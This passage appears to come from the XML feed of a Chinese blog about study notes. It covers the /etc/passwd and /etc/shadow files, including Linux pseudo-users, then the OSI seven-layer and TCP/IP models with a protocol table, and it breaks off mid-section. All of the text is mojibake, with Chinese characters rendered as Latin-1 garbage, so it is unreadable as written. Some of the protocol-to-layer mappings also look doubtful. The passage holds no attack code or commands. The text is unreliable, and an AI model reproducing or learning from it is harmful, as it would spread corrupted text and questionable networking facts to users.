ƒ½å‡ºç°åœ¨è¿™ä¸ªå­—æ®µä¸­ã€‚ç³»ç»Ÿä¸­æœ‰ä¸€ç±»ç”¨æˆ·ç§°ä¸ºä¼ªç”¨æˆ·ï¼ˆpsuedousersï¼‰<br>ç”¨æˆ·åœ¨Linux <code>/etc/passwd</code> æ–‡ä»¶ä¸­ä¹Ÿå æœ‰ä¸€æ¡è®°å½•ï¼Œä½†æ˜¯ä¸èƒ½ç™»å½•ï¼Œå› ä¸ºå®ƒä»¬çš„ç™»å½•Shellä¸ºç©ºã€‚å®ƒä»¬çš„å­˜åœ¨ä¸»è¦æ˜¯æ–¹ä¾¿ç³»ç»Ÿç®¡ç†ï¼Œæ»¡è¶³ç›¸åº”çš„ç³»ç»Ÿè¿›ç¨‹å¯¹æ–‡ä»¶å±ä¸»çš„è¦æ±‚ã€‚å¸¸è§çš„ä¼ªç”¨æˆ·å¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin         æ‹¥æœ‰å¯æ‰§è¡Œçš„ç”¨æˆ·å‘½ä»¤æ–‡ä»¶</span><br><span class="line">sys         æ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶</span><br><span class="line">adm         æ‹¥æœ‰å¸æˆ·æ–‡ä»¶</span><br><span class="line">uucp        UUCPä½¿ç”¨</span><br><span class="line">lplpæˆ–lpd   å­ç³»ç»Ÿä½¿ç”¨</span><br><span class="line">nobody      NFSä½¿ç”¨</span><br></pre></td></tr></table></figure></div>

<p>é™¤äº†ä¸Šé¢åˆ—å‡ºçš„ä¼ªç”¨æˆ·å¤–ï¼Œè¿˜æœ‰è®¸å¤šæ ‡å‡†çš„ä¼ªç”¨æˆ·ï¼Œä¾‹å¦‚ï¼šaudit,cron,mail,usenetç­‰ï¼Œå®ƒä»¬ä¹Ÿéƒ½å„è‡ªä¸ºç›¸å…³çš„è¿›ç¨‹å’Œæ–‡ä»¶æ‰€éœ€è¦ã€‚</p>
<p>ç”±äº <code>Linux /etc/passwd</code> æ–‡ä»¶æ˜¯æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»çš„ï¼Œå¦‚æœç”¨æˆ·çš„å¯†ç å¤ªç®€å•æˆ–è§„å¾‹æ¯”è¾ƒæ˜æ˜¾çš„è¯ï¼Œä¸€å°æ™®é€šçš„è®¡ç®—æœºå°±èƒ½å¤Ÿå¾ˆå®¹æ˜“åœ°å°†å®ƒç ´è§£ï¼Œå› æ­¤å¯¹å®‰å…¨æ€§è¦æ±‚è¾ƒé«˜</p>
<p>çš„Linuxç³»ç»Ÿéƒ½æŠŠåŠ å¯†åçš„å£ä»¤å­—åˆ†ç¦»å‡ºæ¥ï¼Œå•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ <code>/etc/shadow</code> æ–‡ä»¶ã€‚åªæœ‰è¶…çº§ç”¨æˆ·æ‰æ‹¥æœ‰è¯¥æ–‡ä»¶è¯»æƒé™ï¼Œè¿™å°±ä¿è¯äº†ç”¨æˆ·å¯†ç çš„å®‰å…¨æ€§ã€‚</p>
<h1 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h1><p><a href="http://c.biancheng.net/view/839.html" target="_blank" rel="noopener">Linux /etc/passwdå†…å®¹è§£é‡Š</a><br><a href="https://www.linuxidc.com/Linux/2018-11/155322.htm" target="_blank" rel="noopener">Linuxä¸­/etc/passwdæ–‡ä»¶è¯¦ç»†è§£æ</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>OSI ä¸ƒå±‚æ¨¡å‹çš„å­¦ä¹ ç¬”è®°</title>
    <url>/yakko117/2020/01/07/OSI%E4%B8%83%E5%B1%82%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="OSI-ä¸ƒå±‚æ¨¡å‹å’ŒTCP-IPæ¨¡å‹åŠå¯¹åº”åè®®"><a href="#OSI-ä¸ƒå±‚æ¨¡å‹å’ŒTCP-IPæ¨¡å‹åŠå¯¹åº”åè®®" class="headerlink" title="OSI ä¸ƒå±‚æ¨¡å‹å’ŒTCP/IPæ¨¡å‹åŠå¯¹åº”åè®®"></a>OSI ä¸ƒå±‚æ¨¡å‹å’ŒTCP/IPæ¨¡å‹åŠå¯¹åº”åè®®</h1><h2 id="ä¸€å¼ å›¾æ¦‚æ‹¬"><a href="#ä¸€å¼ å›¾æ¦‚æ‹¬" class="headerlink" title="ä¸€å¼ å›¾æ¦‚æ‹¬"></a>ä¸€å¼ å›¾æ¦‚æ‹¬</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/aaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/aaa.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="OSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹"><a href="#OSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹" class="headerlink" title="OSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹"></a>OSIä¸ƒå±‚ç½‘ç»œæ¨¡å‹</h2><p>OSIï¼ˆOpen System Interconnectionï¼‰å¼€æ”¾ç³»ç»Ÿäº’è¿å‚è€ƒæ¨¡å‹æ˜¯å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ï¼ˆISOï¼‰åˆ¶å®šçš„ä¸€ä¸ªç”¨äºè®¡ç®—æœºæˆ–é€šä¿¡ç³»ç»Ÿé—´äº’è”çš„æ ‡å‡†ä½“ç³»ã€‚</p>
<table>
<thead>
<tr>
<th align="center">OSIä¸ƒå±‚æ¨¡å‹</th>
<th>åŠŸèƒ½</th>
<th>å¯¹åº”çš„ç½‘ç»œåè®®</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>åº”ç”¨å±‚</strong></td>
<td>åº”ç”¨å±‚æ˜¯ç½‘ç»œä½“ç³»ä¸­æœ€é«˜çš„ä¸€å±‚ï¼Œä¹Ÿæ˜¯å”¯ä¸€é¢å‘ç”¨æˆ·çš„ä¸€å±‚ï¼Œä¹Ÿå¯è§†ä¸ºä¸ºç”¨æˆ·æä¾›å¸¸ç”¨çš„åº”ç”¨ç¨‹åºï¼Œæ¯ä¸ªç½‘ç»œåº”ç”¨éƒ½å¯¹åº”ç€ä¸åŒçš„åè®®</td>
<td>HTTPï¼ŒTFTPï¼ŒFTPï¼ŒNFSï¼ŒWAISï¼ŒSMTP</td>
</tr>
<tr>
<td align="center"><strong>è¡¨ç¤ºå±‚</strong></td>
<td>ä¸»è¦è´Ÿè´£æ•°æ®æ ¼å¼çš„è½¬æ¢ï¼Œç¡®ä¿ä¸€ä¸ªç³»ç»Ÿçš„åº”ç”¨å±‚å‘é€çš„æ¶ˆæ¯å¯ä»¥è¢«å¦ä¸€ä¸ªç³»ç»Ÿçš„åº”ç”¨å±‚è¯»å–ï¼Œç¼–ç è½¬æ¢ï¼Œæ•°æ®è§£æï¼Œç®¡ç†æ•°æ®çš„è§£å¯†å’ŒåŠ å¯†ï¼ŒåŒæ—¶ä¹Ÿå¯¹åº”ç”¨å±‚çš„åè®®è¿›è¡Œç¿»è¯‘</td>
<td>Telnetï¼ŒRloginï¼ŒSNMPï¼Œ Gopher</td>
</tr>
<tr>
<td align="center"><strong>ä¼šè¯å±‚</strong></td>
<td>è´Ÿè´£ç½‘ç»œä¸­ä¸¤èŠ‚ç‚¹çš„å»ºç«‹ï¼Œåœ¨æ•°æ®ä¼ è¾“ä¸­ç»´æŠ¤è®¡ç®—æœºç½‘ç»œä¸­ä¸¤å°è®¡ç®—æœºä¹‹é—´çš„é€šä¿¡è¿æ¥ï¼Œå¹¶å†³å®šä½•æ—¶ç»ˆæ­¢é€šä¿¡</td>
<td>SMTPï¼ŒDNS</td>
</tr>
<tr>
<td align="center"><strong>ä¼ è¾“å±‚</strong></td>
<td>æ˜¯æ•´ä¸ªç½‘ç»œå…³é”®çš„éƒ¨åˆ†ï¼Œæ˜¯å®ç°ä¸¤ä¸ªç”¨æˆ·è¿›ç¨‹é—´ç«¯åˆ°ç«¯çš„å¯é é€šä¿¡ï¼Œå¤„ç†æ•°æ®åŒ…çš„é”™è¯¯ç­‰ä¼ è¾“é—®é¢˜ã€‚æ˜¯å‘ä¸‹é€šä¿¡æœåŠ¡æœ€é«˜å±‚ï¼Œå‘ä¸Šç”¨æˆ·åŠŸèƒ½æœ€åº•å±‚ã€‚å³å‘ç½‘ç»œå±‚æä¾›æœåŠ¡ï¼Œå‘ä¼šè¯å±‚æä¾›ç‹¬ç«‹äºç½‘ç»œå±‚çš„ä¼ é€æœåŠ¡å’Œå¯é çš„é€æ˜æ•°æ®ä¼ è¾“.</td>
<td>TCPï¼ŒUDP</td>
</tr>
<tr>
<td align="center"><strong>ç½‘ç»œå±‚</strong></td>
<td>è¿›è¡Œé€»è¾‘åœ°å€å¯»å€ï¼Œå®ç°ä¸åŒç½‘ç»œä¹‹é—´çš„è·¯å¾„é€‰æ‹©ï¼ŒIPå°±åœ¨ç½‘ç»œå±‚</td>
<td>IPï¼ŒICMPï¼ŒARPï¼ŒRARPï¼ŒAKPï¼ŒUUCP</td>
</tr>
<tr>
<td align="center"><strong>æ•°æ®é“¾è·¯å±‚</strong></td>
<td>ç‰©ç†åœ°å€ï¼ˆMACåœ°å€ï¼‰ï¼Œç½‘ç»œè®¾å¤‡çš„å”¯ä¸€èº«ä»½æ ‡è¯†ã€‚å»ºç«‹é€»è¾‘è¿æ¥ã€è¿›è¡Œç¡¬ä»¶åœ°å€å¯»å€ï¼Œç›¸é‚»çš„ä¸¤ä¸ªè®¾å¤‡é—´çš„äº’ç›¸é€šä¿¡</td>
<td>FDDIï¼ŒEthernetï¼ŒArpanetï¼ŒPDNï¼ŒSLIPï¼ŒPPPï¼ŒSTPã€‚HDLCï¼ŒSDLCï¼Œå¸§ä¸­ç»§</td>
</tr>
<tr>
<td align="center"><strong>ç‰©ç†å±‚</strong></td>
<td>ä¸ƒå±‚æ¨¡å‹ä¸­çš„æœ€åº•å±‚ï¼Œä¸»è¦æ˜¯ç‰©ç†ä»‹è´¨ä¼ è¾“åª’ä»‹ï¼ˆç½‘çº¿æˆ–è€…æ˜¯æ— çº¿ï¼‰ï¼Œåœ¨ä¸åŒè®¾å¤‡ä¸­ä¼ è¾“æ¯”ç‰¹ï¼Œå°†0/1ä¿¡å·ä¸ç”µä¿¡å·æˆ–è€…å…‰ä¿¡å·äº’ç›¸è½¬åŒ–</td>
<td>IEEE 802.1Aï¼ŒIEEE 802.2åˆ°IEEE 802</td>
</tr>
</tbody></table>
<p>æ•°æ®å‘é€æ—¶ä»ä¸Šè‡³ä¸‹å°è£…ï¼Œæ”¶åˆ°æ•°æ®åŒ…åä»ä¸‹è‡³ä¸Šè§£åŒ…ã€‚</p>
<hr>
<h2 id="TCP-IPå››å±‚æ¨¡å‹"><a href="#TCP-IPå››å±‚æ¨¡å‹" class="headerlink" title="TCP/IPå››å±‚æ¨¡å‹"></a>TCP/IPå››å±‚æ¨¡å‹</h2><p>TCP/IPå››å±‚æ¨¡å‹ï¼šTCP/IPå‚è€ƒæ¨¡å‹æ˜¯è®¡ç®—æœºç½‘ç»œçš„ç¥–çˆ¶ARPANETå’Œå…¶åç»§çš„å› ç‰¹ç½‘ä½¿ç”¨çš„å‚è€ƒæ¨¡å‹ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3uv186j307w075tan.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3uv186j307w075tan.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="ä¸­ç»§ç³»ç»Ÿ"><a href="#ä¸­ç»§ç³»ç»Ÿ" class="headerlink" title="ä¸­ç»§ç³»ç»Ÿ"></a>ä¸­ç»§ç³»ç»Ÿ</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3usp55j319u0q3jt2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3usp55j319u0q3jt2.jpg" class="lazyload" title="test"></a></p>
<p>å®Œæˆä¸­ç»§åŠŸèƒ½çš„èŠ‚ç‚¹é€šå¸¸ç§°ä¸ºä¸­ç»§ç³»ç»Ÿã€‚åœ¨OSIä¸ƒå±‚æ¨¡å‹ä¸­ï¼Œå¤„äºä¸åŒå±‚çš„ä¸­ç»§ç³»ç»Ÿå…·æœ‰ä¸åŒçš„åç§°ã€‚<br>ä¸€ä¸ªè®¾å¤‡å·¥ä½œåœ¨å“ªä¸€å±‚ï¼Œå…³é”®çœ‹å®ƒå·¥ä½œæ—¶åˆ©ç”¨å“ªä¸€å±‚çš„æ•°æ®å¤´éƒ¨ä¿¡æ¯ã€‚ç½‘æ¡¥å·¥ä½œæ—¶ï¼Œæ˜¯ä»¥MACå¤´éƒ¨æ¥å†³å®šè½¬å‘ç«¯å£çš„ï¼Œå› æ­¤æ˜¾ç„¶å®ƒæ˜¯æ•°æ®é“¾è·¯å±‚çš„è®¾å¤‡ã€‚<br>å…·ä½“è¯´:<br><strong>ç‰©ç†å±‚</strong>ï¼šç½‘å¡ï¼Œç½‘çº¿ï¼Œé›†çº¿å™¨ï¼Œä¸­ç»§å™¨ï¼Œè°ƒåˆ¶è§£è°ƒå™¨</p>
<p><strong>æ•°æ®é“¾è·¯å±‚</strong>ï¼šç½‘æ¡¥ï¼Œäº¤æ¢æœº</p>
<p><strong>ç½‘ç»œå±‚</strong>ï¼šè·¯ç”±å™¨</p>
<p>ç½‘å…³å·¥ä½œåœ¨ç¬¬å››å±‚ä¼ è¾“å±‚åŠå…¶ä»¥ä¸Š</p>
<p>é›†çº¿å™¨æ˜¯ç‰©ç†å±‚è®¾å¤‡,é‡‡ç”¨å¹¿æ’­çš„å½¢å¼æ¥ä¼ è¾“ä¿¡æ¯ã€‚</p>
<p>äº¤æ¢æœºå°±æ˜¯ç”¨æ¥è¿›è¡ŒæŠ¥æ–‡äº¤æ¢çš„æœºå™¨ã€‚å¤šä¸ºé“¾è·¯å±‚è®¾å¤‡(äºŒå±‚äº¤æ¢æœº)ï¼Œèƒ½å¤Ÿè¿›è¡Œåœ°å€å­¦ä¹ ï¼Œé‡‡ç”¨å­˜å‚¨è½¬å‘çš„å½¢å¼æ¥äº¤æ¢æŠ¥æ–‡.ã€‚</p>
<p>è·¯ç”±å™¨çš„ä¸€ä¸ªä½œç”¨æ˜¯è¿é€šä¸åŒçš„ç½‘ç»œï¼Œå¦ä¸€ä¸ªä½œç”¨æ˜¯é€‰æ‹©ä¿¡æ¯ä¼ é€çš„çº¿è·¯ã€‚é€‰æ‹©é€šç•…å¿«æ·çš„è¿‘è·¯ï¼Œèƒ½å¤§å¤§æé«˜é€šä¿¡é€Ÿåº¦ï¼Œå‡è½»ç½‘ç»œç³»ç»Ÿé€šä¿¡è´Ÿè·ï¼ŒèŠ‚çº¦ç½‘ç»œç³»ç»Ÿèµ„æºï¼Œæé«˜ç½‘ç»œç³»ç»Ÿç•…é€šç‡ã€‚ </p>
<hr>
<h3 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a><strong>ç‰©ç†å±‚</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœ¨OSIå‚è€ƒæ¨¡å‹ä¸­ï¼Œç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰æ˜¯å‚è€ƒæ¨¡å‹çš„æœ€ä½å±‚ï¼Œä¹Ÿæ˜¯OSIæ¨¡å‹çš„ç¬¬ä¸€å±‚ã€‚</span><br></pre></td></tr></table></figure></div>

<p>ã€€ã€€ç‰©ç†å±‚çš„ä¸»è¦åŠŸèƒ½æ˜¯ï¼šåˆ©ç”¨ä¼ è¾“ä»‹è´¨ <code>ä¸ºæ•°æ®é“¾è·¯å±‚æä¾›ç‰©ç†è¿æ¥</code> ï¼Œå®ç°æ¯”ç‰¹æµçš„é€æ˜ä¼ è¾“ã€‚å®ç°ç›¸é‚»è®¡ç®—æœºèŠ‚ç‚¹ä¹‹é—´æ¯”ç‰¹æµçš„é€æ˜ä¼ é€ï¼Œå°½å¯èƒ½å±è”½æ‰å…·ä½“ä¼ è¾“ä»‹è´¨å’Œç‰©ç†è®¾å¤‡çš„å·®å¼‚ã€‚ä½¿å…¶ä¸Šé¢çš„æ•°æ®é“¾è·¯å±‚ä¸å¿…è€ƒè™‘ç½‘ç»œçš„å…·ä½“ä¼ è¾“ä»‹è´¨æ˜¯ä»€ä¹ˆã€‚â€œé€æ˜ä¼ é€æ¯”ç‰¹æµâ€è¡¨ç¤ºç»å®é™…ç”µè·¯ä¼ é€åçš„æ¯”ç‰¹æµæ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚</p>
<p>ã€€ã€€ç‰©ç†å±‚çš„ä»»åŠ¡å°±æ˜¯ä¸ºå®ƒçš„ä¸Šä¸€å±‚æä¾›ä¸€ä¸ªç‰©ç†è¿æ¥ï¼Œä»¥åŠå®ƒä»¬çš„æœºæ¢°ã€ç”µæ°”ã€åŠŸèƒ½å’Œè§„ç¨‹ç‰¹æ€§ã€‚å¦‚è§„å®šä½¿ç”¨ç”µç¼†å’Œæ¥å¤´çš„ç±»å‹ã€ä¼ é€ä¿¡å·çš„ç”µå‹ç­‰ã€‚åœ¨è¿™ä¸€å±‚ï¼Œæ•°æ®è¿˜æ²¡æœ‰è¢«ç»„ç»‡ï¼Œä»…ä½œä¸ºåŸå§‹çš„ä½æµæˆ–ç”µæ°”ç”µå‹å¤„ç†ï¼Œå•ä½æ˜¯bitã€‚</p>
<p>ã€€ã€€<strong>ã€ç‰©ç†å±‚ä¸ºè‹¦é€¼çš„æ¬è¿å·¥ï¼šå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ä¼ è¾“æ¯”ç‰¹æµï¼Œå¤–é¢æ¥æ¯”ç‰¹æµå°±å°†å®ƒä¼ ç»™æ•°æ®é“¾è·¯å±‚ã€æ•°æ®é“¾è·¯å±‚æ¥æ¯”ç‰¹æµå°±å°†å®ƒä¼ åˆ°å¤–è¾¹å»ï¼ˆæ¯”ç‰¹æµï¼šå°±æ˜¯ç”±1ã€0è½¬åŒ–ä¸ºç”µæµå¼ºå¼±æ¥è¿›è¡Œä¼ è¾“,åˆ°è¾¾ç›®çš„åœ°ååœ¨è½¬åŒ–ä¸º1ã€0ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„æ¨¡æ•°è½¬æ¢ä¸æ•°æ¨¡è½¬æ¢ï¼‰ã€‘</strong></p>
<hr>
<h3 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a><strong>æ•°æ®é“¾è·¯å±‚</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ã€€ã€€æ•°æ®é“¾è·¯å±‚ï¼ˆDatalink Layerï¼‰æ˜¯OSIå‚è€ƒæ¨¡å‹çš„ç¬¬äºŒå±‚ã€‚</span><br></pre></td></tr></table></figure></div>

<p>ã€€ã€€å®ƒæ§åˆ¶ç½‘ç»œå±‚ä¸ç‰©ç†å±‚ä¹‹é—´çš„é€šä¿¡ï¼Œæ˜¯ä¸€ä¸ªæ¡¥æ¢ã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯ <code>å¦‚ä½•åœ¨ä¸å¯é çš„ç‰©ç†çº¿è·¯ä¸Šè¿›è¡Œæ•°æ®çš„å¯é ä¼ é€’ã€‚</code></p>
<p>ã€€ã€€ä¸ºäº†ä¿è¯ä¼ è¾“ï¼Œä»ç½‘ç»œå±‚æ¥æ”¶åˆ°çš„æ•°æ®è¢« <code>åˆ†å‰²æˆç‰¹å®šçš„å¯è¢«ç‰©ç†å±‚ä¼ è¾“çš„å¸§</code>ã€‚</p>
<p>ã€€ã€€å¸§æ˜¯ç”¨æ¥ç§»åŠ¨æ•°æ®çš„ç»“æ„åŒ…ï¼Œå®ƒåŒ…æ‹¬ï¼š<code>åŸå§‹æ•°æ®ï¼›å‘é€æ–¹ã€æ¥æ”¶æ–¹çš„ç‰©ç†åœ°å€ï¼ˆç¡®å®šäº†å¸§å°†å‘é€åˆ°ä½•å¤„ï¼‰ï¼›çº é”™å’Œæ§åˆ¶ä¿¡æ¯ï¼ˆç¡®ä¿å¸§æ— å·®é”™åˆ°è¾¾ï¼‰</code></p>
<p>ã€€ã€€å¦‚æœåœ¨ä¼ é€æ•°æ®æ—¶ï¼Œæ¥æ”¶ç‚¹æ£€æµ‹åˆ°æ‰€ä¼ æ•°æ®ä¸­æœ‰å·®é”™ï¼Œå°±è¦é€šçŸ¥å‘é€æ–¹é‡å‘è¿™ä¸€å¸§ã€‚</p>
<p>ã€€ã€€æ•°æ®é“¾è·¯å±‚çš„åŠŸèƒ½ç‹¬ç«‹äºç½‘ç»œå’Œå®ƒçš„èŠ‚ç‚¹å’Œæ‰€é‡‡ç”¨çš„ç‰©ç†å±‚ç±»å‹ï¼Œå®ƒä¹Ÿä¸å…³å¿ƒæ˜¯å¦æ­£åœ¨è¿è¡Œ <code>Word</code> ã€<code>Excel</code> æˆ–ä½¿ç”¨ <code>Internet</code> ã€‚æœ‰ä¸€äº›è¿æ¥è®¾å¤‡ï¼Œå¦‚äº¤æ¢æœºï¼Œç”±äºå®ƒä»¬è¦å¯¹å¸§è§£ç å¹¶ä½¿ç”¨å¸§ä¿¡æ¯å°†æ•°æ®å‘é€åˆ°æ­£ç¡®çš„æ¥æ”¶æ–¹ï¼Œæ‰€ä»¥å®ƒä»¬æ˜¯å·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚çš„ã€‚æ•°æ®é“¾è·¯å±‚ï¼ˆDataLinkLayer):åœ¨ç‰©ç†å±‚æä¾›æ¯”ç‰¹æµæœåŠ¡çš„åŸºç¡€ä¸Šï¼Œå»ºç«‹ç›¸é‚»ç»“ç‚¹ä¹‹é—´çš„æ•°æ®é“¾è·¯ï¼Œé€šè¿‡å·®é”™æ§åˆ¶æä¾›æ•°æ®å¸§ï¼ˆFrameï¼‰åœ¨ä¿¡é“ä¸Šæ— å·®é”™çš„ä¼ è¾“ï¼Œå¹¶è¿›è¡Œå„ç”µè·¯ä¸Šçš„åŠ¨ä½œç³»åˆ—ã€‚<code>æ•°æ®é“¾è·¯å±‚åœ¨ä¸å¯é çš„ç‰©ç†ä»‹è´¨ä¸Šæä¾›å¯é çš„ä¼ è¾“ã€‚</code></p>
<p>ã€€ã€€<code>è¯¥å±‚çš„ä½œç”¨åŒ…æ‹¬ï¼šç‰©ç†åœ°å€å¯»å€ã€æ•°æ®çš„æˆå¸§ã€æµé‡æ§åˆ¶ã€æ•°æ®çš„æ£€é”™ã€é‡å‘ç­‰ã€‚</code></p>
<p>ã€€ã€€<strong>ã€æ•°æ®é“¾è·¯å±‚ä¸ºä¸­é—´æ²Ÿé€šäººï¼šä¸»è¦ä»»åŠ¡æ¡¥æ¢ï¼ˆåˆ†å‰²ã€ä¼ é€’ã€ç›‘æ§ã€‚ã€‚ã€‚ï¼‰ã€‘</strong></p>
<hr>
<h3 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a><strong>ç½‘ç»œå±‚</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç½‘ç»œå±‚ï¼ˆNetwork Layerï¼‰æ˜¯OSIå‚è€ƒæ¨¡å‹çš„ç¬¬ä¸‰å±‚ã€‚ï¼ˆå³NDISï¼‰</span><br></pre></td></tr></table></figure></div>

<p>ã€€ã€€å…¶ <code>ä¸»è¦åŠŸèƒ½æ˜¯å°†ç½‘ç»œåœ°å€ç¿»è¯‘æˆå¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œå¹¶å†³å®šå¦‚ä½•å°†æ•°æ®ä»å‘é€æ–¹è·¯ç”±åˆ°æ¥æ”¶æ–¹ã€‚</code></p>
<p>ã€€ã€€ç½‘ç»œå±‚é€šè¿‡ç»¼åˆè€ƒè™‘å‘é€ä¼˜å…ˆæƒã€ç½‘ç»œæ‹¥å¡ç¨‹åº¦ã€æœåŠ¡è´¨é‡ä»¥åŠå¯é€‰è·¯ç”±çš„èŠ±è´¹æ¥å†³å®šä»ä¸€ä¸ªç½‘ç»œä¸­èŠ‚ç‚¹A åˆ°å¦ä¸€ä¸ªç½‘ç»œä¸­èŠ‚ç‚¹B çš„æœ€ä½³è·¯å¾„ã€‚<br>ã€€ã€€ç”±äºç½‘ç»œå±‚å¤„ç†ï¼Œå¹¶æ™ºèƒ½æŒ‡å¯¼æ•°æ®ä¼ é€ï¼Œè·¯ç”±å™¨è¿æ¥ç½‘ç»œå„æ®µï¼Œæ‰€ä»¥è·¯ç”±å™¨å±äºç½‘ç»œå±‚ã€‚ç½‘ç»œè´Ÿè´£åœ¨æºæœºå™¨å’Œç›®æ ‡æœºå™¨ä¹‹é—´å»ºç«‹å®ƒä»¬æ‰€ä½¿ç”¨çš„è·¯ç”±ã€‚è¿™ä¸€å±‚æœ¬èº«æ²¡æœ‰ä»»ä½•é”™è¯¯æ£€æµ‹å’Œä¿®æ­£æœºåˆ¶ï¼Œå› æ­¤ï¼Œç½‘ç»œå±‚å¿…é¡»ä¾èµ–äºç«¯ç«¯ä¹‹é—´çš„ç”±DLLæä¾›çš„å¯é ä¼ è¾“æœåŠ¡ã€‚<br>     ç®€å•çš„æ¥è¯´å°±æ˜¯åœ¨ç½‘ç»œä¸­æ‰¾åˆ°ä¸€æ¡è·¯å¾„ï¼Œä¸€æ®µä¸€æ®µåœ°ä¼ é€ï¼Œç”±äºæ•°æ®é“¾è·¯å±‚ä¿è¯ä¸¤ç‚¹ä¹‹é—´çš„æ•°æ®æ˜¯æ­£ç¡®çš„ï¼Œå› æ­¤æºåˆ°ç›®çš„åœ°çš„æ•°æ®ä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œè¿™æ ·ä¸€å°æœºå™¨ä¸Šçš„ä¿¡æ¯å°±èƒ½ä¼ åˆ°å¦å¤–ä¸€å°äº†ã€‚ä½†è®¡ç®—æœºç½‘ç»œçš„æœ€ç»ˆç”¨æˆ·ä¸æ˜¯ä¸»æœºï¼Œè€Œæ˜¯ä¸»æœºä¸Šçš„æŸä¸ªåº”ç”¨è¿›ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹ç”±ä¼ è¾“å±‚å®ç°ã€‚</p>
<hr>
<h3 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a><strong>ä¼ è¾“å±‚</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰æ˜¯OSIå‚è€ƒæ¨¡å‹çš„ç¬¬å››å±‚ã€‚ï¼ˆå³TCPï¼‰</span><br></pre></td></tr></table></figure></div>
<p>ã€€ã€€ä¼ è¾“åè®®åŒæ—¶è¿›è¡Œæµé‡æ§åˆ¶æˆ–æ˜¯åŸºäºæ¥æ”¶æ–¹å¯æ¥æ”¶æ•°æ®çš„å¿«æ…¢ç¨‹åº¦ <code>è§„å®šé€‚å½“çš„å‘é€é€Ÿç‡</code>ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¼ è¾“å±‚æŒ‰ç…§ç½‘ç»œèƒ½å¤„ç†çš„æœ€å¤§å°ºå¯¸ <code>å°†è¾ƒé•¿çš„æ•°æ®åŒ…è¿›è¡Œå¼ºåˆ¶åˆ†å‰²ï¼ˆæ ‡è®°æ•´ç†æˆæœ‰åºçš„åŒ…</code>ï¼‰ã€‚<br>ã€€ã€€ä¾‹å¦‚ï¼Œä»¥å¤ªç½‘æ— æ³•æ¥æ”¶å¤§äº1500å­—èŠ‚(Byte)çš„æ•°æ®åŒ…ã€‚å‘é€æ–¹èŠ‚ç‚¹çš„ä¼ 